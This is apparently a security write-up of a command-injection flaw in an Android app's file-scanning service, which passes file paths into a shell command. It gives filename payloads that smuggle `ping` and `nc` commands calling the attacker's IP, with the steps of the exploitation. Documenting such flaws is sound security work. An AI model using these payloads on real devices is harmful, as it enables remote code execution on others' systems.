# Analysis
1. The application is running service that do loop through all files in external storage every 6 seconds and called `scanFile`.
![Loop files](images/loop%20all%20file%20external%20storage.png)

2. The file hash sha1 is being checked using function `scanFile`, this function is used the full path of the file in os command.
![Vulnerable code](images/vulnerable%20code.png)

3. By creating malicious filename in external storage, we able to gain remote code execution using this payload.
```sh
touch "zzz & ping -c 5 192.168.188.200 &"
touch "zzz & nc 192.168.188.200 8002"
```

# Exploitation
1. First time run the application, the app will asking permission to allow access manages all files.
![Ask for permission](images/app%20asking%20permission.png)

2. We create malicious filename in `/storage/emulator/0/Download/`
![create malicious filename](images/created%20malicious%20filename.png)

3. Setup listener.
- tcpdump
![tcpdump setup](images/setup%20tcpdump.png)
- nc
![nc setup](images/setup%20nc%20listener.png)

3. IP information for hosts and android (victim)
- Hosts:
![hosts ip](images/ifconfig%20hosts.png)
- Android (Victim):
![victim ip](images/android%20devices%20ip.png)

3. Toggle the button to run the service.
![Enabling services](images/toggle%20enable%20scanner.png)

4. The service is do loop through all files in external storages.
![malicious filename is runned](images/log%20loop%20all%20file.png)

6. We got connection from the android.
- tcpdump (received icmp packet)
![received icmp](images/ping%20received.png)
- nc (received connection)
![received connection](images/nc%20received%20connection.png)